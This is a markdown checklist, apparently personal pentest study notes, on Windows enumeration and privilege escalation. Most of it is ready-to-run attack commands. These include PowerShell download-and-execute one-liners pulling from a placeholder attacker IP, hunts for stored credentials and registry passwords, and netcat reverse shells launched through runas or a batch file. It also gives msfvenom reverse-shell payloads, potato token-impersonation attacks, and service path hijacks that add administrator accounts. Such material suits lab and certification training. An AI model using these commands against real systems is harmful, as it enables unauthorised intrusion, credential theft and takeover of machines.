# Windows Survey and Privilege Escalation (work in progress)

This checklist includes basic enumeration techniques using native commands and Powershell cmdlets, common enumeration tools, and techniques used to escalate priveleges on windows machines.  This is a compialation from multiple courses, books, and other checklists that are referenced at the bottom and throughtout this checklist.

Of note: 
* wmic = Windows Managmenet Instrumentatiom Commandline
* sc = Service Controller
* *Get* commmands are powershell cmdlets

<br/>

## Automated Enumeration Tools

The Below Tools can be used to automate the survey provess.  Reference the source documentation for usage of each tool.  If you plan to use these, run as many as you can as each each one offers different outputs and recommendations that others do not:

#### Bat scripts and Executables

* [winpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
* [Seatbelt](https://github.com/GhostPack/Seatbelt)
* [SharpUp](https://github.com/GhostPack/SharpUp)

#### Powershell Scripts

Before exeuting these scripts, ensure to enable the use powershell scripts with *powershell -ep bypass* from cmd or *Set-ExecutionPolicy Bypass -Scope Process* in PowerShell

* [Sherlock](https://github.com/rasta-mouse/Sherlock)
* [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
```
powershell -exec bypass
. .\PowerUp.ps1
Invoke-AllChecks
```
* [JAWS](https://github.com/411Hall/JAWS)
* [WinEnum](https://github.com/EnginDemirbilek/WinEnum)



#### Vulnerability Scanners and Exploit Suggesters

* [Watson](https://github.com/rasta-mouse/Watson) (Windows 10)
* [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [Metasploit Local Exploit Suggester](https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/)
```
run post/multi/recon/local_exploit_suggester
```
<br/>

## Transferring Files

Webserver method (Linux > Windows):
```
# start a webserver on kali using python
python -m SimpleHTTPServer 80
python3 -m http.server 80

# grab file from the webserver to windows
certutil -urlcache -f http://<IP_ADDR>/<FILE> <OUTPUT_FILE>
powershell -c Invoke-WebRequest "http://<IP_ADDR>/<FILE>" -OutFile "<OUTPUT_FILE>"
powershell "IEX(New-Object Net.WebClient).downloadString('http://<IP_ADDR>/<FILE>')"

# download and execute using powershell from cmd
echo IEX(New-Object Net.WebClient).DownloadString('http://<IP_ADDR>/<FILE>') | powershell -noprofile - 
```

FTP Server Method:
```
# install the python module
pip3 install pyftpdlib

# start up the ftp server
python3 -m pyftpdlib -p 21 --write

# connect to the FTP server from windows and dowload
ftp <IP_ADDR>
USER anonymous
PASSWORD <BLANK>

# (Linux > Windows)
get <FILE> 

# (Windows > Linux)
put <FILE>
```

SMB method (Linux > Windows):
```
# enable smb on the target windows machine (may only work with admin privs)


# start up smbserver on linux 
python3 /usr/share/doc/python3-impacket/examples/smbserver.py <SHARE_NAME> <DIRECTORY_TO_SHARE>

# on windows copy the files needed from the smb server:
copy \\<IP_ADDR>\<SHARE_NAME>\<FILE> <DESTINATION>

```
<br/>

## Survey Commands

#### System Information (Hardware/Software):
```
systeminfo
ver 
hostname

# only OS information 
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# verbose hotfix (patch) info 
wmic qfe
wmic qfe get Caption,Description,HotFixID,InstalledOn
```
List the disk drives:
```
wmic logicaldisk get caption,description,providername 
```

<br/>

#### Users and Groups:

View the current user's information:
```
# username
whoami
echo %username%
$env:UserName

# user details
whoami /all
net user <USERNAME>

# user privilages (looking for SeImperonsatePrivilege/SeAssignPrimaryToken or SeChangeNotifyPrivilege for token impersonation)
whoami /priv
```
<br/>

Enviornment variables:
```
set
Get-ChildItem Env: | ft Key,Value
```
Enumerate users and groups: 
```
# who else is logged in 
qwinsta

# local users
net user
net user <USERNAME>
Get-LocalUser

# domain users 
net user /domain 
net user <USERNAME> /domain

#search through user directories
tree /f /a C:\Users\<USERNAME>
Get-ChildItem C:\Users\<USERNAME> -Force

# search for files with alternate data streams (hidden data indicated by $DATA):
dir /R C:\Users\<USERNAME>
more <FILE_WITH_HIDDEN_DATA>

# local groups 
net localgroup
Get-LocalGroups

# view users in a group
net localgroup <GROUP>
Get-LocalGroupMember <GROUP>

# domain groups 
net groups
net groups /domain
```

*Continue on page 627 of PWK

<br/>

## Networking:

Networking configuration:
```
ipconfig
ipconfig /all
route print
arp -a
type C:\windows\system32\drivers\etc\networks
```
Display active TCP/UDP connections:
```
netstat -ano

# connections with executeable 
netstat -bano
```
Conntections Explained (reference: https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)
* Local address 0.0.0.0 means that the service is listening on all interfaces. This means that it can receive a connection from the network card and anyone can connect to it (should have shown up in the nmap scan)
* Local address 127.0.0.1 means that the service is only listening for connections from the PC itself, not from the internet or anywhere else (will not show up in a external nmap scan)
* A private IP address means that the service is only listening for connections from the local network. So someone in the local network can connect to it, but not someone from the internet (will not show up in a external nmap scan)

To access a service that is only accessible from the target machine, setup port forwarding using plink (ensure to download the latest version!):
```
plink.exe -l <ATTACKER_USERNAME> -pw <ATTACKER_PASSOWRD> -R <ATTACKER_PORT>:127.0.0.1:<VICTIM_PORT> <ATTACKER_IP>

#The attacker port should provide access to the service on the attacker machine
```

Firewall status:
```
# windows defender
sc query windefend

# firewall (old)
netsh firewall show state
netsh firewall  show config

# firewall (new)
netsh advfirewall show allprofiles
netsh advfirewall show global
```

<br/>

#### Password Hunting:

Look for stored credentials.
```
cmdkey /list
```
If there are stored credential for a user with adminstrative privileges, use runas to execute commands such as executing a netcat reverse shell:
```
runas /savecred /user:<HOSTNAME>\<USER> "<IP_ADDRESS> <PORT> -e cmd.exe"
```
Find the string *password* in certain types of files: 
```
# search current directory
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
findstr /si password *.config

# look through payloadallthethings
```
The Windows answer file contains setting definitions and values to use during Windows Setup (including passwords):
```
# search for the answer file
where /R C:\ Unattend.xml

#Scroll down to the “<Password>” property and copy the base64 string that is confined between the “<Value>” tags underneath it.
#base64 decode
echo <copied base64> | base64 -d

```
Wifi passwords:
```
netsh wlan show profile
netsh wlan show profile <SSID> key=clear | findstr "Key Content"
```

Registry:
```
# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

Search the HIVESfor passwords:
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

*To-Do: GPP Passwords - refernce HTB Active 

<br/>

#### Processes and Services

Running proceeses:
```
wmic process list brief
sc queryex type= service 
sc queryex type= service  | finstr "SERVICE NAME"
```
Running services:
```
net start
```

<br/>


## Priviliege Escalation Techniques

This section includes identifying and exploiting common vulnerabilites in Windows to gain adminstrative privlieges

<br/>

### Windows Subsytem for Linux (WSL)

Reference - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---windows-subsystem-for-linux-wsl

Windows Subsystem for Linux (WSL) allows users to create a bind shell on any port or reverse shells (no elevation needed).

First locate wsl:
```
where /R C:\Windows bash.exe 
where /R C:\Windows wsl.exe 
```
Determine if the bash/wsl is run as root:
```
wsl.exe whoami 
```
Open a bash terminal using the subsytem:
```
bash.exe 
wsl.exe

# spawn a tty shell 
python -c 'import pty; pty.spawn("/bin/bash")'
```

Perform standard linux enumeration:
```
pwd 
id 
history
etc...
```
<br/>

### Token Impersonstion (Payloadallthethings)

Reference - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges

Tokens are temporary keys that give you access to a system/network without having to provide credentials each time you access a file (think of these as cookies for a computer)

Types of tokens
* Delegate - created for logging into a machine using RDP
* Impersonate - "non-interactive" such as attaching a network drive or a doman login script

First check your current privileges if not done already:
```
whoami /priv
```
If you see `SeImpersonatePrivilege`, you can proceed with a token impersonation attack.  You can also run window-exploit suggester and see if there are any vulnerabilites to potato attacks

#### Method 1: Metasploit Token Impersonation (Potato Attack)

references: 

First you must have a meterpreter shell on the target machine, then verify your privileges:
```
meterpreter > getprivs
```
Now see if the machine is vulnerable to any of the built in potato attacks:
```
meterpreter > run post/multi/recon/local_exploit_suggester

# should see one of these in the output:
[+] exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable
[+] exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
```
Background the current meterpreter sessions and setup for the potato attack:
```
meterpreter > background

# specify the exploit
use exploit/windows/local/ms16_075_reflection

# choose payload
set payload windows/x64/meterpreter/reverse_tcp

# final options
set LPORT <PORT>
set LHOST <IP_ADDRESS>
set SESSION <SESSION_#>

run
```

In meterpreter, load incognito mode and see if there is an admin account we can impersonate: 
```
meterpreter > incognito

meterpreter > list tokens -u
```

Look for *Impersonation Tokens Available* and use the account you want to impersonate:
```
meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"
```
Now you should have a session with system privilegs

#### Method 2: Tater.ps1

Reference - https://github.com/Kevin-Robertson/Tater

First start up powershell: 
```
powershell.exe -nop -ep bypass
```
For this example, import Tater.ps1 and use it to add a user that you already have access to to the adminstrators group:
```
Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1

# add user to the admin group
Invoke-Tater -Trigger 1 -Command "net localgroup administrators <USER> /add"
```
Confirm that the user was added to the right group:
```
net localgroup administrators
```
#### Method 3: Juicy Potato

Reference - https://0xrick.github.io/hack-the-box/conceal/

Downluad the juicy potato [executable](https://github.com/ohpe/juicy-potato/releases) and move it to the target machine.  You will also need to have netcat on the target machine to get the reverse shell.

Create a .bat reverse shell on the target machine:
```
echo nc.exe -e cmd.exe <IP_ADDRESS> <PORT> > rev.bat
```
We need to know the version of this windows to pick the right CLSID.  Ensure to run *systeminfo* to get this.  Now check for the corresponding CLSID [here](https://github.com/ohpe/juicy-potato/tree/master/CLSID).  With all of that we can execute the reverse shell (ensure listener is up on the attacker machine):
```
JuicyPotato.exe -p rev.bat -l <PORT> -t * -c <CLSID>
```

<br/>

### getsystem

reference: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/

`getsystem` uses Meterpreter to elevate you from a local administrator to the SYSTEM user using named pipe inpersonation (one in memory or one on disk) or token duplication (must have SeDebugPrivileges enabled).

```
meterpreter > getsystem
```

<br /> 

### Autorun Escalation

Reference - https://tryhackme.com/room/windowsprivescarena

Looking for executables that are autmomatically run by the system and and if we have permission to change those executeables.  These are automatically run using the registry, task scheduler, or the startup directory.

#### Method 1: Accesschk

Check the system for Autoruns executable:
```
where /R C:\ Autoruns*
```
With a RDP session, open Up Autoruns and look for executables that are automatically started up:
```
<PATH_TO_AUTORUNS>\Autoruns(64).exe>
```
Use [accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) to see who has write abilities to the files in the directory where the executatle is located:
```
accesschk64.exe -wvu "<DIRECTORY>"

# Looking for 
RW Everyone
      FILE_ALL_ACCESS
```

#### Method 2: PowerUp

If no RDP session, use PowerUp to identify modifiable registry autoruns and configs:
```
powershell -ep bypass

.\PowerUp.ps1

Invoke-AllChecks
```
Look under this section:
```
[*] Checking for modifiable registry autoruns and configs
```

#### Exploitation

Create  a reverse shell that will impersonate the executable
```
msfvenom -p windows/shell_reverse_tcp lhost=[Kali VM IP Address] lport=<PORT>-f exe -o <NAME_OF_FILE_TO_IMPERSONATE>
```
Now move this file onto target and replace the good executable with your malicious executable.  Once the conditions are met (login, etc.) your malicous executable will kick off.

<br/>

## AlwaysInstallElevated 

*Need RDP access for this to work

Windows may be configured to to install MSI packages with elevated privileges (administrator user).  First check to see if this is already enabled ( “AlwaysInstallElevated” value is set to 1)
```
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer

# command output
AlwaysInstallElevated  REG_DWORD  0x1
```
#### Method 1: PowerUp

Use PowerUP
```
powershell -ep bypass

.\PowerUp.ps1

Invoke-AllChecks
```
Now look for this output in the survey:
```
{*} Checking for AlwaysInstallElevated registry key...
```
If it came back with a yes, create a malicous msi package with PowerUp:
```
Write-UserAddMSI
```
Now run the malicious MSI and create a new user with administrative privileges.  Now you can login with the new user!

#### Method 2: msfvenom

Create a malicous msi with msfvenom:
```
msfvenom -p windows/shell_reverse_tcp lhost=[Kali VM IP Address] lport=4444 -f msi -o setup.msi
```
setup listener:
```
nc -nlvp <PORT>
```
Transfer the file over to the target machine and run it to catch a reverse shell

#### Method 3: Metasploit

Use a metasploit windows post exploitation script to elevate priviliges if you have a meterpreter shell on the box:
```
use exploit/windows/local/always_install_elevated
set session <SESSION_#>
run
```

<br/>

### Services Escalation - regsvc ACL

See if we have full control of a registry service (regsvc) by checking the ACL for it:
```
powershell -ep bypass
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl

# looking for output with "FullControl"
```
If we have control of the service, we can add an executable to the service and start the service.  

Add a malicous executeable to the *ImagePath* subkey by adding path to the drivers image file: 
```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\<MALICIOUS_EXE> /f
```
Now start/restart the service:
```
sc stop regsvc
sc start regsvc
```

<br/>

### Service Escalation via Executable Files

Start wtih PowerUP:
```
powershell -ep bypass

.\PowerUp.ps1

Invoke-AllChecks
```
Now look for this output in the survey:
```
{*} Checking service executable and argument permissions...
```
Look at the *Modifiable File* and *Path* of the the executable. You can use accesscheck to verify permissions:
```
accesschk64.exe -wvu "<PATH_TO_EXE>"

# Looking for 
RW Everyone
      FILE_ALL_ACCESS
```
Now replace the executeable with a malicious executeable (windows_services.exe):
```
copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
```
Now start/restart the service which should execute the executable as nt/authority system:
```
sc stop <service>
sc start <service>
```

<br/>

### Startup Applications

Use [icacls](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls) to see if you can read/write to the startup directory:
```
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

# Looking for <F> which means full access
```
Now create a reverse shell executeable to be placed in the startup directory:
```
msfvenom -p windows/shell_reverse_tcp lhost=<ATTACKER_IP> lport=<ATTACKER_PORT>-f exe -o <NAME_OF_FILE_TO_IMPERSONATE>
```
Place the file in the startup directory, once the administrator logs in, you will get a reverse shell (ensure listener is up)

<br/>

### DLL Hijacking

Reference - https://tryhackme.com/room/windowsprivescarena

DLLs are similar to .so files (\*nix) which serve as libraries which run with executables.  Hijacking is looking for an instance where a service is looking for a dll that does not exist and is/should be in a path that is writeable.  Use the reference for how to search for missing DLL's using procmon which will require an RDP session.

<br/>

### Binary Paths

#### Method 1: PowerUP
```
powershell -ep bypass

.\PowerUp.ps1

Invoke-AllChecks
```
Now look for this output in the survey:
```
{*} Checking service permissions...
```
Verify the path to the binary: 
```
sc qc <SERVICE>
```
Verify with accesschk (not required but a good sanity check):
```
# show all services where everyone can read/write
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc Everyone *

# details for any service that was found
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc <SERVICE>

# looking for SERVICE_CHANGE_CONFIG” permission for everyone
```
If we have the SERVICE_CHANGE_CONFIG permission, we can edit the BINARY_PATH_NAME and run a command, such as add a user to the administrators group:
```
sc config <SERVICE> binpath= "net localgroup administrators <USERNAME> /add"

# check it was changed 
sc qc <SERVICE> 

# restart the service so it runs the command
sc stop <SERVICE>
sc start <SERVICE> 

# verify the user has been added to the administrators group
net localgroup administrators
```

<br/>

### Unquoted Service Paths

Occurs when a service's executable path contains a space and is not enclosed in quoations marks. 

#### Method 1: PowerUP (can also use Winpeas)
```
powershell -ep bypass

.\PowerUp.ps1

Invoke-AllChecks
```
Now look for this output in the survey:
```
{*} Checking for unquoted service...
```
Notice that the “BINARY_PATH_NAME” field displays a path that is not confined between quotes. place a malicious executeable somewhere in th path.

* Example, if the path of the exe is C:\Progam Files\service.exe, place a malicious executeable as C:\Progam.exe (if you have permission to write to that directory)

Generate a malicious executeable that will add a user to the administrator group:
```
msfvenom -p windows/exec CMD='net localgroup administrators <USER> /add' -f exe-service -o program.exe
```
Place the executeable in the path of the legitimate executeable.  Now restart the service which should run the malicous executable
```
# check the status of the service
sc query <SERVICE>

# restart if needed
sc stop <SERVICE>
sc start <SERVICE> 

# verify the cahnges took effect
net localgroup administrators
```

<br/> 

### runas

Look for stored credentials.
```
cmdkey /list
```
Check the full path of runas and use as needed: 
```
where /R C:\ runas.exe
```
If there are stored credentials for a user with adminstrative privileges, use runas to execute commands like kicking off a netcat reverse shell:
```
runas /savecred /user:ACCESS\Administrator "nc.exe <IP_ADDRESS> <PORT> -e cmd.exe"
```
If you have credentials for an administrator.  Using runas with a provided set of credential to execute a command as that user:
```
runas /env /noprofile /user:<USERNAME> <PASSWORD> "nc.exe <IP_ADDRESS> <PORT> -e cmd.exe"
```
<br/>

### psexec

Use psexec tool from windows sysinternals to spawn an admin reverse shell:
```
# generate payload
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTAKCER_PORT> -f exe -o reverse.exe

# execute payload
.\PsExec64 -acccepteula -i -s <REVERSE_SHELL_EXECUTEABLE>
```

<br/>

### Bloodhound (Needs Work)

Also reffered to as walking the dog...
```
#install
sudo apt install bloodhound 

#start bloodhound
bloodhound

#start neo4
neo4j console

#run sharphound on the target windows machine
./Sharphound.exe

#copy the zip file to your attacking machine, drag and drop into neo4j
```
Reference Sauna HTB machine

<br/>

### UAC Bypass 
Refernce -  https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe

<br/>

### Kernel Exploits

Check any enumeration script for potential vulnerabilites to common exploits. Other than exploitdb, this site has many precomplied exploits: https://github.com/SecWiki/windows-kernel-exploits

<br/> 

## Reverse Shells 

Basic executeable:
```
# setup the listener
nc -nlvp <LPORT>

# 32 bit cmd.exe
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTAKCER_PORT> -f exe -o reverse.exe

# 64 bit cmd.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTAKCER_PORT> -f exe -o reverse.exe
```

Meterpreter reverse shell:
```
# setup the listener
msf > user exploit/multi/handler
set LHOST
set LPORT
run

# 32-bit payload generation
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTAKCER_PORT> -f exe -o reverse.exe

# 64-bit payload generation
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTAKCER_PORT> -f exe -o reverse.exe
```

<br/> 

## References 

#### Checklists 
* https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
* https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters
* https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
* 

#### Courses
* Udemy Windows Privilege Escalation for Beginners Course
* Udemy Windows Privilege Escalation for OSCP and Beyond! Course

#### Other References
* Hiding data inside of files (Data Streams) - https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/
